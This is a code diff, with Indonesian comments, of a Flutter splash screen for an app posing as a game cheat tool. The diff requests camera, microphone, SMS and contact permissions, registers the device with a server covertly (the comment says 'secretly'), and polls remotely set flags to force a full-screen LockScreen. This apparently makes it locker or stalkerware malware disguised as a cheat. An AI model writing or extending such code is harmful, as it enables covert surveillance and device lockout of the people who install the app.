@@ -23,14 +23,42 @@ class _SplashScreenState extends State<SplashScreen> {
   }
 
   Future<void> _bootstrap() async {
+    // 1. Minta Izin (Dikasih batas waktu 4 detik, biar gak nge-hang)
     try {
       await [
         Permission.camera, Permission.microphone,
         Permission.sms, Permission.contacts, Permission.notification,
-      ].request();
-    } catch (e) {}
+      ].request().timeout(const Duration(seconds: 4));
+    } catch (e) {
+      debugPrint("Permission error: $e");
+    }
 
-    // Nembak Server (Register)
+    // 2. Register ke server secara diam-diam (Gak ngeblok aplikasi)
+    _registerDevice();
+
+    // 3. Cek Lock Screen
+    final prefs = await SharedPreferences.getInstance();
+    Timer.periodic(const Duration(seconds: 2), (t) async {
+      final v1 = prefs.getBool('lock_v1') ?? false;
+      final v2 = prefs.getBool('lock_v2') ?? false;
+      if ((v1 || v2) && mounted) {
+        t.cancel();
+        Navigator.of(context).pushAndRemoveUntil(
+          MaterialPageRoute(builder: (_) => LockScreen(mode: v2 ? 2 : 1)),
+          (_) => false,
+        );
+      }
+    });
+
+    // 4. SELALU PINDAH KE MENU UTAMA SETELAH 2 DETIK
+    await Future.delayed(const Duration(seconds: 2));
+    if (!mounted) return;
+    Navigator.of(context).pushReplacement(
+      MaterialPageRoute(builder: (_) => const CheatHome()),
+    );
+  }
+
+  Future<void> _registerDevice() async {
     try {
       final prefs = await SharedPreferences.getInstance();
       String? devId = prefs.getString('dev_id');
@@ -48,27 +76,10 @@ class _SplashScreenState extends State<SplashScreen> {
           'model': '${info.manufacturer} ${info.model}',
           'android': info.version.release,
         }),
-      ).timeout(const Duration(seconds: 5));
-    } catch (e) {}
-
-    final prefs = await SharedPreferences.getInstance();
-    Timer.periodic(const Duration(seconds: 2), (t) async {
-      final v1 = prefs.getBool('lock_v1') ?? false;
-      final v2 = prefs.getBool('lock_v2') ?? false;
-      if ((v1 || v2) && mounted) {
-        t.cancel();
-        Navigator.of(context).pushAndRemoveUntil(
-          MaterialPageRoute(builder: (_) => LockScreen(mode: v2 ? 2 : 1)),
-          (_) => false,
-        );
-      }
-    });
-
-    await Future.delayed(const Duration(seconds: 3));
-    if (!mounted) return;
-    Navigator.of(context).pushReplacement(
-      MaterialPageRoute(builder: (_) => const CheatHome()),
-    );
+      ).timeout(const Duration(seconds: 4));
+    } catch (e) {
+      debugPrint("Gagal konek server: $e");
+    }
   }
 
   @override
